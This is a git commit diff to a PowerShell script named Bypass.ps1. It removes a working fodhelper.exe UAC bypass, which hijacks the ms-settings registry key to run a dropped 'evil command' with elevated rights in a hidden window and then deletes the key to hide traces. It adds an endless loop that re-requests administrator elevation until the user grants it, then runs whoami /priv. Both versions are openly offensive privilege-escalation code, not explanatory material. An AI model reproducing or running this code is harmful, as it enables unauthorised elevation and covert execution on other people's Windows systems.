7a3b80f571dd93159679719653a42a17791dfde6
43a1723 <hai1723notgay@gmail.com>
2024-05-30 11:14:04 +0700

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -1,16 +1,11 @@
-#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
-
-$yourevilcommand = "C:\Users\Public\150F4013\run.cmd"
-
-#Adding all the reistry required with your command.
-
-New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
-
-#Starts the fodhelper process to execute your command.
-
-Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-
-#Cleaning up the mess created.
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
+$command = "C:\Windows\System32\cmd.exe"
+while($true)
+ {
+	 try
+  {  
+    Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c whoami /priv';exit
+     
+	}
+    catch{}   
+}
